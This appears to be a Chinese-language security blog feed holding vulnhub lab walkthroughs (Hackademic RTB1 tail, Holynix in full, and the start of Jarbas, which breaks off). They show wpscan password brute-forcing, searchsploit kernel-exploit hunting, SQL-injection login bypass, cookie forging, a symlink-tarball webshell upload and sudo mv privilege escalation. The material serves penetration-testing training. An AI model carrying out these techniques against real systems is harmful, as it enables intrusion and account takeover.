alt="image.png"></p><blockquote><p>这批先试这几个：</p><ol><li>50135编译失败</li><li>15024编译成功，运行失败</li><li>15916和15944编译成功，运行报错一致</li><li>17787报错</li></ol></blockquote><blockquote><p>继续细化，只看提权：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142523.png" alt="image.png"></p><blockquote><p>这几个都想试(悲)：</p><ol><li>14814编译成功，执行失败</li><li>15023编译失败</li><li>15774编译成功，执行失败</li><li>34923编译失败</li><li>44302编译成功，执行失败</li><li>34134编译失败</li></ol></blockquote><blockquote><ol><li>44299编译失败</li><li>26131编译失败</li><li>25450编译成功，执行失败</li><li>43345编译成功，执行失败</li><li>45553编译失败</li><li>45010编译失败</li><li>44298编译失败</li><li>44300编译失败</li><li>43418编译失败</li><li>47169编译失败</li></ol></blockquote><blockquote><p>仍没有可以的利用，扩大范围将版本号缩短：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142539.png" alt="image.png"></p><blockquote><p>尝试新出现的两个：</p><ol><li>8369执行报错</li><li>15285编译成功，执行成功</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142553.png" alt="image.png"></p><blockquote><p>成功提权</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142635.png" alt="image.png"></p><h2 id="0x04-反思补足"><a href="#0x04-反思补足" class="headerlink" title="0x04 反思补足"></a>0x04 反思补足</h2><blockquote><ol><li>wp渗透环节走了弯路，未注意公开漏洞sql注入：cms框架渗透前先搜公开漏洞，留个印象重点关注</li><li>sql注入环节可以精简：cms框架渗透的数据库结构可以直接查到，节约大量时间<br> <img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143434.png" alt="image.png"></li><li>内核提权环节可通过缩短版本号扩大搜索范围，可grep限定Privilege(提权)相关利用</li></ol></blockquote><h2 id="0x04-知识总结"><a href="#0x04-知识总结" class="headerlink" title="0x04 知识总结"></a>0x04 知识总结</h2><h3 id="wordpress渗透流程"><a href="#wordpress渗透流程" class="headerlink" title="wordpress渗透流程"></a>wordpress渗透流程</h3><blockquote><ol start="0"><li>目录爆破找登录页和确认rpc、api页面是否启用</li><li>信息收集找版本号</li><li>wpscan扫描可用用户</li><li>wpscan小字典爆破密码</li><li>若登录表单无限制，hydra跑rockyou爆密码</li><li>使用wpscan的ap参数枚举可能的公开漏洞，先大致留个印象，渗透过程中主要留意此类漏洞</li><li>拿到凭据后寻找文件上传点，若没有可先尝试用xmlrpc.php上传</li><li>仍然失败时考虑公开漏洞利用，sql注入(可拿其他高权限用户)优先</li><li>通过公开漏洞信息寻找注入点，此类开源cms甚至可以直接google出数据库结构便利注入</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://10.10.10.134/Hackademic_RTB1/ --enumerate u  <br><br>wpscan --url http://10.10.10.134/Hackademic_RTB1/ --usernames FYHypo --passwords /usr/share/seclists/Passwords/500-worst-passwords.txt<br><br>wpscan --url http://10.10.10.134/Hackademic_RTB1/ --enumerate ap --api-token  0Du8ow5jLqgfJgCOnxvsgKaEZacsPltJCKAaQDyFoCg<br></code></pre></td></tr></table></figure><h3 id="内核提权流程"><a href="#内核提权流程" class="headerlink" title="内核提权流程"></a>内核提权流程</h3><blockquote><ol><li>跑linpeas，选probable的cve编号找exp</li><li>直接搜内核版本号+限定权限提升词条，排除无关发行版本的特定利用</li><li>缩短版本号扩大范围</li><li>去掉词条限定，考虑其他利用形式</li><li>直接google由<code>uname -a</code>的回显</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit --cve &lt;CVE编号&gt; <br>searchsploit -m &lt;exp编号&gt;<br>searchsploit linux kernel 2.6.31.5(完整编号) | grep <span class="hljs-string">&quot;Privilege&quot;</span><br>searchsploit linux kernel 2.6.3(缩短编号) | grep <span class="hljs-string">&quot;Privilege&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub Holynix</title>
    <link href="/blog/vulnhub/vulnhub%20Holynix/"/>
    <url>/blog/vulnhub/vulnhub%20Holynix/</url>
    
    <content type="html"><![CDATA[<p>vulhub Holynix walkthrough</p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132109.png" alt="image.png"></p><blockquote><p>该靶机提供的为tar.bz2文件，先用PS解压</p></blockquote><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><blockquote><p>主机发现：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132133.png" alt="image.png"></p><blockquote><p>全端口扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132140.png" alt="image.png"></p><blockquote><p>tcp只开了80，保险起见进行udp扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132149.png" alt="image.png"></p><blockquote><p>目前来看确实只有80开放，进行详细信息扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132158.png" alt="image.png"></p><blockquote><p>ubuntu跑着apache，开始web渗透：</p></blockquote><h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><blockquote><p>跑起目录爆破，同时打开浏览器访问web服务：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132221.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132228.png" alt="image.png"></p><blockquote><p>一个登录界面</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132239.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132300.png" alt="image.png"></p><blockquote><p>一句话绕过登录，以alamo身份进到系统</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132308.png" alt="image.png"></p><blockquote><p>雇员名单</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132318.png" alt="image.png"></p><blockquote><p>从留言板得知信息：</p><ol><li>可能目标机安装了gcc</li><li>可能有一个每五分钟一次的计划任务</li><li>ssh服务被部署了端口敲击隐藏起来</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132327.png" alt="image.png"></p><blockquote><p>可以上传文件，且可以自动解压gzip文件</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132347.png" alt="image.png"></p><blockquote><p>只多扫出来两个存放杂文件的目录<br>从文件上传入手：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132353.png" alt="image.png"></p><blockquote><p>报错alamo不允许传文件<br>那就先看Security项目：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132400.png" alt="image.png"></p><blockquote><p>该功能通过此选项控制下方内容，抓包测试，无注入，但text_file_name参数处存在目录穿越：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132409.png" alt="image.png"></p><blockquote><p>读到&#x2F;etc&#x2F;passwd发现除了alamo还有不少其他用户，可能有人有文件上传权限，又想起来登录页面有注入点，尝试注入：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132428.png" alt="image.png"></p><blockquote><p>可以打通，且有creds库，查看：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132439.png" alt="image.png"></p><blockquote><p>看到sqlmap使用的盲注，跑字段果然dump不出来东西，如果还要查就需要写盲注脚本了<br>不过先不急，还有另一个线索可以尝试：<br>目录穿越可以成功，大概率使用的数据流操作函数，尝试使用伪协议读文件：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132448.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$auth</span> == <span class="hljs-number">0</span> ) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h2&gt;Content Restricted&lt;/h2&gt;&lt;/center&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3&gt;Home Directory Uploader&lt;/h3&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;form enctype=&#x27;multipart/form-data&#x27; action=&#x27;index.php?page=transfer.php&#x27; method=&#x27;POST&#x27;&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Please choose a file: &lt;input name=&#x27;uploaded&#x27; type=&#x27;file&#x27; /&gt;&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;input type=&#x27;checkbox&#x27; name=&#x27;autoextract&#x27; value=&#x27;true&#x27; /&gt; Enable the automatic extraction of gzip archives.&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;input type=&#x27;submit&#x27; value=&#x27;Upload&#x27; /&gt;&lt;/form&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>果然可以，这里可以看到upload页面使用auth校验身份，但此文件中又未定义，那么大胆猜测是通过cookie验证的，抓包：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132456.png" alt="image.png"></p><blockquote><p>很幸运的是直接用uid&#x3D;1确定身份，尝试修改：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132518.png" alt="image.png"></p><blockquote><p>成功上传，且看到名字变成了etenenbaum</p></blockquote><blockquote><p>为了找上传路径，查看上传文件的transfer.php：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$auth</span> == <span class="hljs-number">0</span> ) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h2&gt;Content Restricted&lt;/h2&gt;&lt;/center&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$upload</span> == <span class="hljs-number">1</span> )<br>&#123;<br><span class="hljs-variable">$homedir</span> = <span class="hljs-string">&quot;/home/&quot;</span>.<span class="hljs-variable">$logged_in_user</span>. <span class="hljs-string">&quot;/&quot;</span>;<br><span class="hljs-variable">$uploaddir</span> = <span class="hljs-string">&quot;upload/&quot;</span>;<br><span class="hljs-variable">$target</span> = <span class="hljs-variable">$uploaddir</span> . <span class="hljs-title function_ invoke__">basename</span>( <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]) ;<br><span class="hljs-variable">$uploaded_type</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br><span class="hljs-variable">$command</span>=<span class="hljs-number">0</span>;<br><span class="hljs-variable">$ok</span>=<span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$uploaded_type</span> ==<span class="hljs-string">&quot;application/gzip&quot;</span> &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;autoextract&#x27;</span>] == <span class="hljs-string">&#x27;true&#x27;</span> ) &#123;<span class="hljs-variable">$command</span> = <span class="hljs-number">1</span>; &#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$ok</span>==<span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry your file was not uploaded&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&#x27;?index.php?page=upload.php&#x27; &gt;Back to upload page&lt;/a&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$target</span>))<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3&gt;The file &#x27;&quot;</span> .<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]. <span class="hljs-string">&quot;&#x27; has been uploaded.&lt;/h3&gt;&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;The ownership of the uploaded file(s) have been changed accordingly.&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&lt;a href=&#x27;?page=upload.php&#x27; &gt;Back to upload page&lt;/a&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$command</span> == <span class="hljs-number">1</span> )<br>&#123;<br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;sudo tar xzf &quot;</span> .<span class="hljs-variable">$target</span>. <span class="hljs-string">&quot; -C &quot;</span> .<span class="hljs-variable">$homedir</span>);<br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;rm &quot;</span> .<span class="hljs-variable">$target</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;sudo mv &quot;</span> .<span class="hljs-variable">$target</span>. <span class="hljs-string">&quot; &quot;</span> .<span class="hljs-variable">$homedir</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>&#125;<br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/var/apache2/htdocs/update_own&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, there was a problem uploading your file.&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&lt;a href=&#x27;?page=upload.php&#x27; &gt;Back to upload page&lt;/a&gt;&quot;</span>;<br>&#125;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&lt;br /&gt;&lt;h3&gt;Home directory uploading disabled for user &quot;</span> .<span class="hljs-variable">$logged_in_user</span>. <span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>; &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><blockquote><ol><li>不使用解压缩功能：上传到upload&#x2F;，之后移动到对应的家目录</li><li>使用解压缩功能：上传到upload&#x2F;，解压缩到对应的家目录</li><li>还执行了一个脚本 <code>exec(&quot;/var/apache2/htdocs/update_own&quot;)</code></li></ol></blockquote><blockquote><p>&#x2F;var&#x2F;apache2&#x2F;htdocs&#x2F;update_own：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>sudo <span class="hljs-built_in">chown</span> root:root /home/<br>sudo <span class="hljs-built_in">chown</span> -R alamo:developers /home/alamo/<br>sudo <span class="hljs-built_in">chown</span> -R nobody:developers /home/development/<br>sudo <span class="hljs-built_in">chown</span> -R etenenbaum:<span class="hljs-built_in">users</span> /home/etenenbaum/<br>sudo <span class="hljs-built_in">chown</span> -R gmckinnon:<span class="hljs-built_in">users</span> /home/gmckinnon/<br>sudo <span class="hljs-built_in">chown</span> -R hreiser:staff /home/hreiser/<br>sudo <span class="hljs-built_in">chown</span> -R jdraper:<span class="hljs-built_in">users</span> /home/jdraper/<br>sudo <span class="hljs-built_in">chown</span> -R jjames:staff /home/jjames/<br>sudo <span class="hljs-built_in">chown</span> -R jljohansen:developers /home/jljohansen/<br>sudo <span class="hljs-built_in">chown</span> -R kpoulsen:<span class="hljs-built_in">users</span> /home/kpoulsen/<br>sudo <span class="hljs-built_in">chown</span> -R ltorvalds:admin /home/ltorvalds/<br>sudo <span class="hljs-built_in">chown</span> -R mrbutler:staff /home/mrbutler/<br>sudo <span class="hljs-built_in">chown</span> -R rtmorris:<span class="hljs-built_in">users</span> /home/rtmorris/<br></code></pre></td></tr></table></figure><blockquote><p>暴露出了所有用户名，暂时没什么用<br>前往家目录找上传的马：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132530.png" alt="image.png"></p><h3 id="apache每用户目录"><a href="#apache每用户目录" class="headerlink" title="apache每用户目录"></a>apache每用户目录</h3><blockquote><p>从源码可以看到最终的保存路径是&#x2F;home&#x2F;user，但只能通过~user的方式从web访问到：</p></blockquote><blockquote><p>Apache Web 服务器通常允许用户创建个人网页或站点，这些网页可以存放在每个用户的个人目录中。</p></blockquote><blockquote><p>http:&#x2F;&#x2F;&lt;ip&gt;&#x2F;<del>user1 和 http:&#x2F;&#x2F;&lt;ip&gt;&#x2F;home&#x2F;user1 并不等价。在Apache Web服务器中，&#x2F;home&#x2F;user1 是用户的个人目录的实际位置，而 ~user1 是通过mod_userdir模块配置的用户主页的访问路径。http:&#x2F;&#x2F;&lt;ip&gt;&#x2F;</del>user1 是一种特定的语法，在Web服务器中会被解析为用户 user1 的个人目录。而 http:&#x2F;&#x2F;&lt;ip&gt;&#x2F;home&#x2F;user1 则是直接指向 &#x2F;home&#x2F;user1 目录的路径，没有经过 Apache 的 mod_userdir 模块的解析。因此，这个路径可能无法正常访问到用户的个人网页。</p></blockquote><blockquote><p>回到题目：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132538.png" alt="image.png"></p><blockquote><p>居然没有读权限！猜测对整个家目录的上传的文件不具有读权限，想起来上传点还有解压功能，而且tar的解压命令是支持动态软链接的，值得尝试通过软链接将上传路径改到web根目录：</p></blockquote><h3 id="软链接写马"><a href="#软链接写马" class="headerlink" title="软链接写马"></a>软链接写马</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132611.png" alt="image.png"></p><blockquote><p>test1用来改变目录，删掉现有test文件，创建test目录用来写马：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132621.png" alt="image.png"></p><blockquote><p>依次上传test1、test2，最终在web路径下访问shell.php：</p></blockquote><blockquote><p>注意：上传完test1后其实并不会在旧上传目录下看到test，将test理解为管道较为合适<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132629.png" alt="image.png"></p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132639.png" alt="image.png"></p><blockquote><p>成功rce，反弹shell：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132649.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132656.png" alt="image.png"></p><blockquote><p>使用mkfifo反弹成功</p></blockquote><h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132717.png" alt="image.png"></p><blockquote><p>这里也可以看到test确实指向了网站根目录</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132731.png" alt="image.png"></p><blockquote><p>sudo枚举发现不需要密码就可以执行mv</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132738.png" alt="image.png"></p><h3 id="mv提权"><a href="#mv提权" class="headerlink" title="mv提权"></a>mv提权</h3><blockquote><p>由于<code>sudo mv</code>不需要密码，故将&#x2F;bin&#x2F;su移为&#x2F;bin&#x2F;mv，执行<code>sudo mv</code>即无密码执行<code>sudo su</code></p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132757.png" alt="image.png"></p><h2 id="0x04-总结反思补足"><a href="#0x04-总结反思补足" class="headerlink" title="0x04 总结反思补足"></a>0x04 总结反思补足</h2><h3 id="文件上传软链接"><a href="#文件上传软链接" class="headerlink" title="文件上传软链接"></a>文件上传软链接</h3><blockquote><p>利用1. 任意文件读取<br>条件：知道绝对路径、(www-data) 有读权限</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132805.png" alt="image.png"></p><blockquote><p><code>zip --symlinks</code>和<code>tar czf</code>均可打包动态的软链接，上传被解压后访问可以像钩子把目标文件勾出来</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /flag getflag<br>tar czf getflag.tar.gz getflag<br>zip --symlinks getflag.zip getflag<br></code></pre></td></tr></table></figure><blockquote><p>利用2. 改变文件上传路径<br>条件：知道网站根目录绝对路径</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132814.png" alt="image.png"></p><blockquote><p>test1用来改变目录，删掉现有test文件，创建test目录用来写马：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132827.png" alt="image.png"></p><blockquote><p>依次上传test1、test2，最终在web路径下访问shell.php：</p></blockquote><blockquote><p>注意：上传完test1后其实并不会在旧上传目录下看到test，将test理解为管道较为合适<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132849.png" alt="image.png"></p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132855.png" alt="image.png"></p><blockquote><p>在web路径下访问到了shell.php</p></blockquote><h3 id="sqlmap少用batch"><a href="#sqlmap少用batch" class="headerlink" title="sqlmap少用batch"></a>sqlmap少用batch</h3><blockquote><p>再次使用sqlmap跑了遍注入，去掉了batch参数，跑出来了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132908.png" alt="image.png"></p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><ol><li>端口扫描：只扫到了web服务，且存在sql注入</li><li>web渗透：sql一句话进入系统后台，存在当前用户无法使用的文件上传功能，修改cookie成功越权；在找不到上传路径的情况下发现文件包含点，利用伪协议读出各文件，得知上传路径为家目录，但无权访问家目录下的shell；猜测原因为目录权限问题，结合提供了解压缩功能，上传软链接修改上传路径为web根目录，在新上传路径下访问到shell，蚁剑连接，尝试多种反弹shell语句，最终mkfifo反弹成功</li><li>提权：mv命令具有无需密码的sudo权限，将mv的执行文件替换为su的执行文件，执行sudo mv达到sudo su的提权效果</li></ol>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub jarbas</title>
    <link href="/blog/vulnhub/vulnhub%20jarbas/"/>
    <url>/blog/vulnhub/vulnhub%20jarbas/</url>
    
    <content type="html"><![CDATA[<p>vulhub jarbas walkthrough</p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><blockquote><p>主机发现：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194449.png" alt="image.png"></p><blockquote><p>全端口扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194458.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194516.png" alt="image.png"></p><blockquote><p>udp并无有效信息<br>详细信息扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194550.png" alt="image.png"></p><blockquote><p>扫到8080是jetty 9.4.z-snapshot：用于java web的servlet容器(类似tomcat)</p></blockquote><blockquote><p>脚本扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194614.png" alt="image.png"></p><blockquote><p>扫到8080的robots.txt，大致确定本机主要考察web渗透</p></blockquote><h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194624.png" alt="image.png"></p><blockquote><p>80应该是个买东西的网页？有注册、查找功能，查找功能无效</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194630.png" alt="image.png"></p><blockquote><p>8080好像是jenkins的后台登录，jenkins好像是一个集成的开发平台，不是cms</p></blockquote><blockquote><p>我选择从80入手，目录爆破：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194639.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194647.png" alt="image.png"></p><blockquote><p>给了三个creds，还说加密很安全</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194657.png" alt="image.png"></p><blockquote><p>全是md5，解密：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194705.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194937.png" alt="image.png"></p><blockquote><p>拿凭据第一件事先尝试ssh：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194946.png" alt="image.png"></p><blockquote><p>失败<br>回到主站，发现页面显示逻辑好像是通过f参数确定：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194958.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195009.png" alt="image.png"></p><blockquote><p>没测出idor和注入，但是在该页面发现登录和文件上传功能，且上传功能要先登录<br>尝试用刚获取的凭据登录：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195028.png" alt="image.png"></p><blockquote><p>登录功能需要的是邮箱，只能转去尝试注册了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195037.png" alt="image.png"></p><blockquote><p>查看源码发现注册功能根本不能用</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195045.png" alt="image.png"></p><blockquote><p>登录功能确实可用，思路断了<br>只能转去看8080了，目录爆破的同时尝试用刚刚的凭据登录：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195101.png" alt="image.png"></p><blockquote><p>只有eder的凭据登录成功，目录爆破毫无结果，直接开始后台的渗透：</p></blockquote><h3 id="Jenkins后台渗透"><a href="#Jenkins后台渗透" class="headerlink" title="Jenkins后台渗透"></a>Jenkins后台渗透</h3><p><img 